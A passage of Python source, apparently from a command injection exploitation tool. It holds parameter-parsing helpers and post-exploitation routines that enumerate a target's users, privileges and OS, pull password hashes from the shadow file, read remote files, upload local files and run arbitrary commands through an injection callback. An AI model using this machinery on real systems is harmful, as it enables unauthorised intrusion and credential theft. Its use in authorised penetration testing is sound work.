    module = importlib.import_module("src.tamper." + script)
    payload = _apply_tamper(script, module, payload)

  return payload

"""
Skip parameters when the provided value is empty.
"""
def skip_empty(empty_parameters, http_request_method):
  warn_msg = "Skipped the " + http_request_method
  warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
  warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
  warn_msg += " '" + empty_parameters + "' from testing"
  warn_msg += " because you specified testing of only parameter(s) with non-empty value" + "s"[len(empty_parameters.split(",")) == 1:][::-1] + "."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Prints an informational message if a nested JSON structure is detected 
and JSON parameter enumeration has not started yet.
"""
def nested_json_msg(data):
  if not settings.JSON_ENUMERATION_STARTED:
    # Detect nested structure by checking if flattening increases the number of keys
    if len(flatten(data)) > len(data):
      settings.JSON_ENUMERATION_STARTED = True
      info_msg = "Enumerating parameters due to nested JSON structure."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Pretty-print data as valid JSON using 2-space indentation.
"""
def format_json(data):
  nested_json_msg(data)
  indent, separators = settings.JSON_FORMATTING
  return json.dumps(data, indent=indent, ensure_ascii=False, separators=separators)

"""
Put back the whitespace that sat between the XML tags, which the parameter split replaced.
"""
def restore_xml_layout(data):
  if not settings.IS_XML or not settings.XML_TAG_SEPARATORS:
    return data
  separators = list(settings.XML_TAG_SEPARATORS)
  # A payload of its own could add a boundary, and then the recorded layout no longer lines up.
  if len(re.findall(r">\s*<", data)) != len(separators):
    return data
  return re.sub(r">\s*<", lambda match: ">" + separators.pop(0) + "<", data)

"""
A body that is reflowed no longer matches what the target was given, so keep the supplied layout.
"""
def json_formatting(data):
  if settings.END_LINE.LF in data.strip():
    return (2, None)
  return (None, (", ", ": ") if ", " in data else (",", ":"))

"""
A repeated key cannot survive being parsed into an object, so warn rather than drop one quietly.
"""
def warn_on_duplicate_json_keys(data):
  if settings.DUPLICATE_JSON_KEYS_WARNED:
    return
  seen, duplicates = set(), set()
  # Warn once for each parameter that appears more than once in the same request.
  def _hook(pairs):
    for name, _ in pairs:
      if name in seen:
        duplicates.add(name)
      seen.add(name)
    return OrderedDict(pairs)
  try:
    json.loads(data, object_pairs_hook=_hook)
  except Exception:
    return
  if duplicates:
    settings.DUPLICATE_JSON_KEYS_WARNED = True
    warn_msg = "The provided JSON data repeats the key" + "s"[len(duplicates) == 1:] + " '" + "', '".join(sorted(duplicates))
    warn_msg += "'. Only the last occurrence of each is kept."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Parsing and unflattening JSON data.
"""
def json_data(data):
  try:
    data = json.loads(data, object_pairs_hook=OrderedDict)
    data = unflatten_list(data)
    return format_json(data)
  except Exception:
    return data

"""
No parameter(s) found for testing.
"""
def no_parameters_found():
  err_msg = "No parameter(s) found for testing in the provided data "
  err_msg += "(e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). "
  if not menu.options.crawldepth:
    err_msg += "Re-run with '--crawl=2'."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
Check if the provided value is empty.
"""
def is_empty(multi_parameters, http_request_method):
  all_empty = False
  empty_parameters = []
  multi_params = [s for s in multi_parameters]
  if settings.IS_JSON:
    try:
      multi_params = flatten(json.loads(','.join(multi_params), object_pairs_hook=OrderedDict)) if is_JSON_check(','.join(multi_params)) else multi_params
    except ValueError as err_msg:
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
  for empty in multi_params:
    try:
      if settings.IS_JSON:
        try:
          if len(str(multi_params[empty])) == 0 :
            empty_parameters.append(empty)
        except TypeError:
          pass
      elif settings.IS_XML:
        if re.findall(r'>(.*)<', empty)[0] == "" or \
           re.findall(r'>(.*)<', empty)[0] == settings.SINGLE_WHITESPACE:
          empty_parameters.append(re.findall(r'</(.*)>', empty)[0])
      elif len(empty.split("=")[1]) == 0:
        empty_parameters.append(empty.split("=")[0])
    except IndexError:
      pass

  if len(empty_parameters) == len(multi_parameters):
    all_empty = True

  empty_parameters = ", ".join(empty_parameters)
  if len(empty_parameters) > 0:
    if menu.options.skip_empty:
      skip_empty(empty_parameters, http_request_method)
      if all_empty:
        return all_empty
      else:
        return False
    else:
      warn_msg = "The provided value" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " for " + http_request_method
      warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
      warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " '" + empty_parameters + "'"
      warn_msg += (' are ', ' is ')[len(empty_parameters.split(",")) == 1] + "empty. "
      warn_msg += "Use only valid values, so " + settings.APPLICATION
      warn_msg += " can run properly."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      return False

# Check if valid SOAP/XML
def is_XML_check(parameter):
  try:
    if re.search(settings.XML_RECOGNITION_REGEX, parameter):
      return True
  except ValueError:
    return False

#Check if INJECT_TAG is enclosed in quotes (in json data)
def check_quotes_json_data(data):
  if not json.dumps(settings.INJECT_TAG) in data:
    data = data.replace(settings.INJECT_TAG, json.dumps(settings.INJECT_TAG))
  return data

# Check if valid JSON
def is_JSON_check(parameter):
  try:
    # Attempt to load the JSON string
    json.loads(parameter.replace(settings.INJECT_TAG,""))
    settings.IS_VALID_JSON = True
    return settings.IS_VALID_JSON
  except json.JSONDecodeError as err_msg:
    # Handle JSONDecodeError and identify common issues
    if settings.IS_JSON and not settings.IS_VALID_JSON:
      error_str = str(err_msg)
      if "No JSON object could be decoded" in error_str:
          err_msg = "JSON is invalid. No valid JSON object found."
      elif "Expecting" in error_str and any(_ in error_str for _ in ("value", "delimiter")):
          err_msg = "JSON parsing error: " + error_str + ". Check for missing commas, colons, or improperly escaped characters."
      elif "Expecting" in error_str and "end of data" in error_str:
          err_msg = "JSON parsing error: " + error_str + ". Check for extra commas or missing closing brackets."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()


# Process with JSON data
def process_data(data_type, http_request_method):
  while True:
    info_msg = str(data_type) + " data found in " + str(http_request_method) + " body."
    message = info_msg
    message += " Do you want to process it? [Y/n] "
    process = common.read_input(message, default="Y", check_batch=True)
    if process in settings.CHOICE_YES:
      return True
    elif process in settings.CHOICE_NO:
      settings.IGNORE_USER_DEFINED_POST_DATA = True
      return False
    elif process in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(process)
      pass

"""
Check for similarity in provided parameter name and value.
"""
def check_similarities(all_params):
  if settings.IS_JSON:
    try:
      _ = "".join(random.sample(string.ascii_uppercase, k=6))
      flat = flatten(json.loads(','.join(all_params), object_pairs_hook=OrderedDict))
      modified = False
      for param in flat:
        if isinstance(flat[param], str):
          if flat[param] in param:
            flat[param] = flat[param] + settings.RANDOM_TAG
            modified = True
          if settings.SINGLE_WHITESPACE in flat[param]:
            flat[param] = flat[param].replace(settings.SINGLE_WHITESPACE, _)
            modified = True
      if modified:
        all_params = [x.replace(settings.SINGLE_WHITESPACE, "").replace(_, settings.SINGLE_WHITESPACE) for x in json.dumps(flat).split(", ")]
    except Exception:
      pass
  else:
    for param in range(0, len(all_params)):
      if settings.IS_XML:
        if re.findall(r'>(.*)</', all_params[param]):
          if re.findall(r'>(.*)</', all_params[param])[0] in re.findall(r'</(.*)>', all_params[param])[0]:
            parameter_name = ''.join(re.findall(r'</(.*)>', all_params[param]))
            parameter_value = ''.join(re.findall(r'>(.*)</', all_params[param]))
            all_params[param] = "<" + parameter_name + ">" + parameter_value + settings.RANDOM_TAG + "</" + parameter_name + ">"
      else:
        if re.findall(r'(.*)=', all_params[param]) == re.findall(r'=(.*)', all_params[param]):
          parameter_name = ''.join(re.findall(r'=(.*)', all_params[param]))
          if parameter_name:
            all_params[param] = parameter_name + "=" + parameter_name + settings.RANDOM_TAG
        elif re.findall(r'=(.*)', all_params[param])[0] in re.findall(r'(.*)=', all_params[param])[0]:
          parameter_name = ''.join(re.findall(r'(.*)=', all_params[param]))
          parameter_value = ''.join(re.findall(r'=(.*)', all_params[param]))
          all_params[param] = parameter_name + "=" + parameter_value + settings.RANDOM_TAG

  all_params = [str(x) for x in all_params if x is not None]
  return all_params

"""
Generate a character pool for time‑related command injection techniques
"""
def generate_char_pool(num_of_chars):
  if menu.options.charset:
    return [ord(c) for c in menu.options.charset]

  if num_of_chars == 1:
    return list(settings.CHAR_POOL_SINGLE)

  return list(settings.CHAR_POOL_MULTI)
  
"""
Print powershell version
"""
def print_ps_version(ps_version, filename, _):
  ps_version = "".join(str(p) for p in ps_version).strip()
  if settings.VERBOSITY_LEVEL == 0 and _:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  # A version has a number in it, so an answer without one means the command never ran. Taken as a
  # version it leaves PowerShell marked as available, and every payload needing it quietly weakens.
  if not re.search(r"\d", ps_version):
    warn_msg = "Failed to identify the version of Powershell, "
    warn_msg += "which means some payloads or injection techniques may fail."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.PS_ENABLED = False
    ps_check_failed()
    return
  settings.PS_ENABLED = True
  # Output PowerShell's version number
  info_msg = "Powershell version: " + ps_version
  settings.print_data_to_stdout(settings.print_retrieved_data("powershell version", ps_version))
  logs.add_line(filename, info_msg, group="info")
  logs.report_set_info("powershell_version", ps_version)

"""
Print hostname
"""
def print_hostname(shell, filename, _):
  if shell:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Hostname: " +  str(shell)
    settings.print_data_to_stdout(settings.print_retrieved_data("hostname", shell))
    logs.add_line(filename, info_msg, group="info")
    logs.report_set_info("hostname", str(shell))
  else:
    warn_msg = "Failed to identify the hostname."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print current user info
"""
def print_current_user(cu_account, filename, _):
  if cu_account:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Current user: " +  str(cu_account)
    settings.print_data_to_stdout(settings.print_retrieved_data("current user", cu_account))
    logs.add_line(filename, info_msg, group="info")
    logs.report_set_info("current_user", str(cu_account))
  else:
    warn_msg = "Failed to fetch the current user."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print current user privs
"""
def print_current_user_privs(shell, filename, _):
  priv = "True"
  if (settings.TARGET_OS == settings.OS.WINDOWS and not "Admin" in shell) or \
     (settings.TARGET_OS != settings.OS.WINDOWS and shell != "0"):
    priv = "False"

  if settings.VERBOSITY_LEVEL == 0 and _:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  info_msg = "Current user has elevated privileges: " +  str(priv)
  settings.print_data_to_stdout(settings.print_retrieved_data("current user has elevated privileges", priv, quoted=False))
  logs.add_line(filename, info_msg, group="info")
  logs.report_set_info("current_user_elevated_privileges", priv == "True")
"""
Print OS info
"""
def print_os_info(target_os, target_arch, filename, _):
  if target_os and target_arch:
    if settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
    settings.print_data_to_stdout(settings.print_retrieved_data("operating system", str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)))
    logs.add_line(filename, info_msg, group="info")
    logs.report_set_info("operating_system", str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch))
  else:
    warn_msg = "Failed to fetch target operating system information."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Print enumeration info msgs
"""
class print_enumenation():
  # What is about to be asked of the target, named the way the answer will be labelled.
  def _fetching(self, what):
    settings.print_data_to_stdout(settings.print_info_msg("Fetching the " + what + "."))

  # Say the powershell version is being fetched.
  def ps_version_msg(self):
    self._fetching("powershell version")

  # Say the hostname is being fetched.
  def hostname_msg(self):
    self._fetching("hostname")

  # Say the current user is being fetched.
  def current_user_msg(self):
    self._fetching("current user")

  # Say the current user's privileges are being fetched.
  def check_privs_msg(self):
    self._fetching("current user's privileges")

  # Say the target operating system is being fetched.
  def os_info_msg(self):
    self._fetching("target operating system")

  # Say the operating system users are being fetched.
  def print_users_msg(self):
    self._fetching("operating system users")

  # Say the users' password hashes are being fetched.
  def print_passes_msg(self):
    self._fetching("operating system users' password hashes")

  # Not a fetch: the command is the user's own, and it is named rather than described.
  def print_single_os_cmd_msg(self, cmd):
    info_msg =  "Executing user-supplied command '" + cmd + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Classify a uid into a human-readable privilege label, mirroring '/etc/passwd' conventions.
"""
def classify_uid(uid):
  uid = int(uid)
  if uid == 0:
    return "root user"
  elif 0 < uid < 99:
    return "system user"
  elif 99 <= uid <= 65534:
    if uid in (99, 60001, 65534):
      return "anonymous user"
    elif uid == 60002:
      return "non-trusted user"
    else:
      return "regular user"
  return ""

"""
Print users enumeration: a bare '* name' list, plus a per-user privileges section when requested.
"""
def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter):

  # Windows users enumeration.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    try:
      denied = any(phrase.lower() in str(sys_users).lower() for phrase in settings.WIN_ACCESS_DENIED)
      if sys_users and not denied:
        sys_users = "".join(str(p) for p in sys_users).strip()
        sys_users_list = re.findall(r"(.*)", sys_users)
        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
        sys_users_list = ' '.join(sys_users_list.split())
        sys_users_list = sys_users_list.split()
        # Output that parsed to nothing is not a list of users, and saying nothing at all about it
        # reads as though the enumeration had simply found none.
        if len(sys_users_list) == 0:
          no_user_enumeration_permission()
        else:
          if settings.VERBOSITY_LEVEL == 0 and _:
            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
          info_msg = "operating system"
          info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
          info_msg += " [" + str(len(sys_users_list)) + "]:"
          settings.print_data_to_stdout(info_msg)
          logs.add_line(filename, info_msg, group="users")
          for name in sys_users_list:
            settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + name)
            logs.add_line(filename, "  * " + name, group="users")
            logs.report_add_enumeration("users", name)
      else:
        no_user_enumeration_permission()
    except TypeError:
      pass
    except IndexError:
      no_user_enumeration_permission()
      pass

  # Unix-like users enumeration.
  else:
    try:
      if sys_users:
        sys_users = "".join(str(p) for p in sys_users).strip()
        if len(sys_users.split(settings.SINGLE_WHITESPACE)) <= 1 :
          sys_users = sys_users.split(settings.END_LINE.LF)
        else:
          sys_users = sys_users.split(settings.SINGLE_WHITESPACE)
        # Check for appropriate '/etc/passwd' format.
        if len(sys_users) % 3 != 0 :
          warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is "
          warn_msg += "not in the appropriate format. Thus, exporting it as a text file."
          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          sys_users = " ".join(str(p) for p in sys_users).strip()
          settings.print_data_to_stdout(sys_users)
          logs.add_line(filename, "      " + sys_users, group="users")
        else:
          sys_users_list = []
          for user in range(0, len(sys_users), 3):
             sys_users_list.append(sys_users[user : user + 3])
          if len(sys_users_list) != 0 :
            if settings.VERBOSITY_LEVEL == 0 and _:
              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
            info_msg = "operating system"
            info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
            info_msg += " [" + str(len(sys_users_list)) + "]:"
            settings.print_data_to_stdout(Style.BRIGHT + info_msg + Style.RESET_ALL)
            logs.add_line(filename, info_msg, group="users")

            parsed_users = []
            count = 0
            for user in range(0, len(sys_users_list)):
              entry = ":".join(str(p) for p in sys_users_list[user])
              count = count + 1
              fields = entry.split(":")
              try:
                if not fields[2].startswith("/"):
                  raise ValueError()
                parsed_users.append((fields[0], fields[1], fields[2]))
                settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + fields[0])
                logs.add_line(filename, "  * " + fields[0], group="users")
                logs.report_add_enumeration("users", fields[0])
              except ValueError:
                if count == 1 :
                  warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is not in the "
                  warn_msg += "appropriate format. Thus, exporting it as a text file."
                  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
                raw_line = " ".join(str(p) for p in fields)
                settings.print_data_to_stdout(raw_line)
                logs.add_line(filename, "      " + raw_line, group="users")

            # Per-user privileges, only when explicitly requested.
            if menu.options.privileges and parsed_users:
              fetch_msg = "Fetching the operating system users' privileges."
              settings.print_data_to_stdout(settings.print_info_msg(fetch_msg))
              info_msg = "operating system"
              info_msg += " user" + ('s', '')[len(parsed_users) == 1]
              info_msg += "' privileges [" + str(len(parsed_users)) + "]:"
              settings.print_data_to_stdout(Style.BRIGHT + info_msg + Style.RESET_ALL)
              logs.add_line(filename, info_msg, group="privileges")
              for name, uid, homedir in parsed_users:
                label = classify_uid(uid)
                note = " (" + label + ", uid=" + uid + ", home directory '" + homedir + "')" if label else " (uid=" + uid + ", home directory '" + homedir + "')"
                settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + name + note)
                logs.add_line(filename, "  * " + name + note, group="privileges")
                logs.report_add_enumeration("privileges", {"name": name, "uid": uid, "home_directory": homedir, "type": label})
      else:
        warn_msg = "It seems you do not have permission "
        warn_msg += "to read the contents of the file '" + settings.PASSWD_FILE + "'."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    except TypeError:
      pass
    except IndexError:
      warn_msg = "Some kind of WAF/IPS probably blocks the attempt to read '"
      warn_msg += settings.PASSWD_FILE + "' to enumerate operating system users."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      pass

"""
Print users enumeration.
"""
def print_passes(sys_passes, filename, _, interpreter):
  if sys_passes:
    sys_passes = "".join(str(p) for p in sys_passes).strip()
    sys_passes = sys_passes.replace(settings.SINGLE_WHITESPACE, settings.END_LINE.LF).split()
    if len(sys_passes) != 0 :
      if settings.VERBOSITY_LEVEL == 0 and _:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      """
      Worked out before the count is announced. Most accounts carry no hash - a '*' or a '!' where
      one would be - and those lines are not printed, so counting every line read gave a heading of
      forty-five above a list of two.
      """
      usable = []
      malformed = False
      for line in sys_passes:
        fields = line.split(":") if ":" in line else []
        if len(fields) < 2:
          malformed = malformed or bool(line)
          continue
        if "*" not in fields[1] and "!" not in fields[1] and fields[1] != "":
          usable.append((fields[0], fields[1]))
      if malformed:
        warn_msg = "It seems '" + settings.SHADOW_FILE + "' file is not "
        warn_msg += "in the appropriate format. Thus, exporting it as a text file."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      info_msg = "operating system"
      info_msg += " user" + ('s', '')[len(usable) == 1]
      info_msg += " password hashes [" + str(len(usable)) + "]:"
      settings.print_data_to_stdout(info_msg)
      logs.add_line(filename, info_msg, group="passwords")
      for username, digest in usable:
        settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + username + ":" + digest)
        logs.add_line(filename, "  * " + username + ":" + digest, group="passwords")
        logs.report_add_enumeration("passwords", {"username": username, "hash": digest})
    else:
      warn_msg = "Unable to retrieve the password hashes for the operating system users."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  else:
    warn_msg = "Unable to retrieve the password hashes for the operating system users."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Run the standard enumeration checks via the given execute_cmd(cmd) -> output callback - the shared logic behind any module's own enumeration entry point (see shellshock.py).
"""
def run_enumeration(execute_cmd, filename, url):
  ran = False

  if menu.options.hostname:
    ran = True
    print_enumenation().hostname_msg()
    shell = execute_cmd(settings.HOSTNAME)
    if shell:
      print_hostname(shell, filename, False)

  if menu.options.current_user:
    ran = True
    print_enumenation().current_user_msg()
    shell = execute_cmd(settings.CURRENT_USER)
    if shell:
      print_current_user(shell, filename, False)

  if menu.options.is_root:
    ran = True
    print_enumenation().check_privs_msg()
    cmd = remove_parenthesis(''.join(re.findall(r"\$(.*)", settings.IS_ROOT)))
    shell = execute_cmd(cmd)
    if shell:
      print_current_user_privs(shell, filename, False)

  if menu.options.sys_info:
    ran = True
    print_enumenation().os_info_msg()
    target_os = execute_cmd(settings.RECOGNISE_OS)
    if target_os == "Linux":
      distro_name = execute_cmd(settings.DISTRO_INFO)
      if distro_name:
        target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
      target_arch = execute_cmd(settings.RECOGNISE_HP)
      print_os_info(target_os, target_arch, filename, False)

  if menu.options.users:
    ran = True
    print_enumenation().print_users_msg()
    cmd = remove_command_substitution(settings.SYS_USERS)
    shell = execute_cmd(cmd)
    if shell:
      print_users(shell, filename, False, None, None, cmd, None, None, None, None, url, None, interpreter=False)

  if menu.options.passwords:
    ran = True
    print_enumenation().print_passes_msg()
    cmd = remove_command_substitution(settings.SYS_PASSES)
    shell = execute_cmd(cmd)
    if shell:
      print_passes(shell, filename, False, interpreter=False)

  if ran:
    settings.ENUMERATION_DONE = True

"""
Run the single --os-cmd execution via the given execute_cmd(cmd) -> output callback.
"""
def run_single_os_cmd(execute_cmd, filename):
  cmd = menu.options.os_cmd
  print_enumenation().print_single_os_cmd_msg(cmd)
  shell = execute_cmd(cmd)
  print_single_os_cmd(cmd, shell, filename)

"""
Print single OS command
"""
def print_single_os_cmd(cmd, output, filename):
  # One character is an answer too - 'echo A' was reported as having returned nothing.
  if len(output) > 0:
    settings.print_data_to_stdout(settings.print_retrieved_data("execution output", output))
    logs.executed_command(filename, cmd, output)
  else:
    err_msg = common.invalid_cmd_output(cmd)
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    if menu.options.abort_on_empty:
      raise SystemExit()

"""
Quote provided cmd
"""
def quoted_cmd(cmd):
  cmd = "\"" + cmd + "\""
  return cmd

"""
Escape file content for a double-quoted "printf" argument.
"""
def escape_file_content(content):
  content = content.replace("\\", "\\\\")
  content = content.replace("\"", "\\\"")
  content = content.replace("$", "\\$")
  content = content.replace("`", "\\`")
  content = content.replace("%", "%%")
  content = content.replace(settings.END_LINE.LF, "\\n")
  return content

"""
Add new "cmd /c"
"""
def add_new_cmd(cmd):
  cmd = "cmd /c " + cmd
  return cmd

"""
Escape single quoted cmd
"""
def escape_single_quoted_cmd(cmd):
  cmd = cmd.replace("'","\\'")
  return cmd

"""
Find filename
"""
def find_filename(dest_to_write, content):
  norm_dest = dest_to_write.replace("\\", "/")
  dirpath = os.path.dirname(norm_dest)
  fname = norm_dest
  tmp_fname = (dirpath + "/" if dirpath else "") + os.path.basename(norm_dest) + "_tmp"
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + tmp_fname
  return fname, tmp_fname, cmd

"""
Decode base 64 encoding
"""
def win_decode_b64_enc(fname, tmp_fname):
  cmd = settings.CERTUTIL_DECODE_CMD + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + fname.replace("\\","\\\\")
  return cmd

"""
Add command substitution on provided command
"""
def add_command_substitution(cmd):
  cmd = "echo $(" + cmd + ")"
  return cmd

"""
Remove command substitution on provided command
"""
def remove_command_substitution(cmd):
  cmd = cmd.replace("echo $(", "").replace(")", "")
  return cmd

# The command with its brackets taken out, where the carrier cannot hold them.
def remove_parenthesis(cmd):
  cmd = cmd.replace("(", "").replace(")", "")
  return cmd

"""
Write the file content
"""
def write_content(content, dest_to_write):
  content = quoted_cmd(content)
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_WRITE_OPERATOR  + dest_to_write.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
  else:
    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + quoted_cmd(dest_to_write)
  return cmd

"""
Delete filename
"""
def delete_tmp(tmp_fname):
  cmd = settings.WIN_DEL + tmp_fname.replace("\\","\\\\")
  return cmd

"""
Check if file exists.
"""
def check_file(remote_file_path):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.FILE_LIST_WIN + remote_file_path.replace("\\","\\\\")
  else:
    cmd = settings.FILE_LIST + quoted_cmd(remote_file_path)
    cmd = add_command_substitution(cmd)
  return cmd

"""
File content to read.
"""
def file_content_to_read(file_to_read=None):
  file_to_read = file_to_read or menu.options.file_read
  info_msg = "Fetching the contents of the file '"
  info_msg += file_to_read + "'."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_READ + file_to_read.replace("\\","\\\\")
  else:
    if settings.EVAL_BASED_STATE:
      cmd = "(" + settings.FILE_READ + file_to_read + ")"
    else:
      cmd = settings.FILE_READ + file_to_read
  return cmd, file_to_read

"""
Cheap pre-check for file existence/non-emptiness before full extraction.
"""
def file_readable(separator, timesec, http_request_method, url, vuln_parameter, whitespace, prefix, suffix, url_time_response, file_to_read, technique):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return True
  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    payloads = time_based_payloads()
  else:
    payloads = tempfile_based_payloads()
  payload = payloads.condition_check(separator, "-s " + file_to_read, timesec, http_request_method)
  if payload is None:
    return True
  exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
  return time_related_shell(exec_time, timesec)

"""
File read status
"""
def file_read_status(shell, file_to_read, filename):
  if shell:
    _ = "file contents"
    settings.print_data_to_stdout(settings.print_retrieved_data(_, shell))
    logs.add_line(filename, "Extracted content of the file '" + file_to_read + "': " + shell, group="file:" + file_to_read)
    logs.report_add_file(file_to_read, shell)
  else:
    warn_msg = "Retrieved no content for the file '" + file_to_read + "'. "
    warn_msg += "This could mean the file does not exist, is empty, or you do not have permission to read it."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Build the final destination path for file write operations.
"""
def check_destination(destination, where=None):
  where = where or menu.options.file_write
  # Normalize path separators before splitting.
  normalized = destination.replace("\\", "/")
  # A destination with no trailing filename is a directory, so append the local filename.
  if os.path.split(normalized)[1] == "":
    _ = os.path.split(normalized)[0].rstrip("/") + "/" + os.path.split(where)[1]
  else:
    _ = destination
  return _

"""
Write the content of a local file to a remote destination.
"""
def check_file_to_write(file_to_write=None, dest=None):
  file_to_write = file_to_write or menu.options.file_write
  if not os.path.exists(file_to_write):
    err_msg = "The specified local file '" + file_to_write + "' does not exist."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  if os.path.isfile(file_to_write):
    try:
      with open(file_to_write, 'r', encoding=settings.DEFAULT_CODEC) as content_file:
        content = content_file.read()
    except (OSError, UnicodeDecodeError) as err:
      err_msg = "Unable to read the local file '" + file_to_write + "' (" + str(err) + "). "
      err_msg += "Note that '--file-write' does not support binary files."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
    content = content.replace(settings.END_LINE.CRLF, settings.END_LINE.LF).replace(settings.END_LINE.CR, settings.END_LINE.LF)
    if settings.TARGET_OS == settings.OS.WINDOWS:
      import base64
      content = base64.b64encode(content.encode(settings.DEFAULT_CODEC)).decode()
    else:
      content = escape_file_content(content)
  else:
    warn_msg = "The specified path '" + file_to_write + "' is not a file."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    raise SystemExit()

  dest_to_write = check_destination(destination=dest or menu.options.file_dest, where=file_to_write)
  info_msg = "Attempting to write the contents of file '"
  info_msg += file_to_write + "' to the remote directory '" + dest_to_write + "'."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  return file_to_write, dest_to_write, content

"""
Display the result of an attempted file write to the remote target.
"""
def file_write_status(shell, dest_to_write):
  if shell and settings.INCOMPLETE_OUTPUT:
    warn_msg = "The write to '" + dest_to_write + "' could not be verified - the confirmation "
    warn_msg += "output came back incomplete."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  elif shell:
    info_msg = "The file has been successfully created in remote directory: '" + dest_to_write + "'."
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  else:
    warn_msg = "The file does not appear to exist in the remote directory '" + dest_to_write + "'. "
    warn_msg += "This could mean the write failed, or you do not have permission to write to that directory."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))


"""
Write a local file to the target, through the given execute_cmd(cmd) -> output callback.
"""
def upload_file(execute_cmd, file_to_write, dest_to_write, content):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    fname, tmp_fname, cmd = find_filename(dest_to_write, content)
    execute_cmd(cmd)
    execute_cmd(win_decode_b64_enc(fname, tmp_fname))
    execute_cmd(delete_tmp(tmp_fname))
    shell = execute_cmd(check_file(dest_to_write))
  else:
    execute_cmd(write_content(content, dest_to_write))
    shell = execute_cmd(remove_command_substitution(check_file(dest_to_write)))
  file_write_status(shell, dest_to_write)

"""
Read a file from the target, through the given execute_cmd(cmd) -> output callback.
"""
def download_file(execute_cmd, file_to_read, filename):
  cmd, file_to_read = file_content_to_read(file_to_read)
  shell = execute_cmd(remove_command_substitution(cmd))
  file_read_status(shell, file_to_read, filename)
  return shell

"""
Split an interactive "download"/"upload" command into its two path arguments.
"""
def shell_transfer_args(cmd, usage):
  try:
    args = shlex.split(cmd)[1:]
  except ValueError:
    args = cmd.split()[1:]
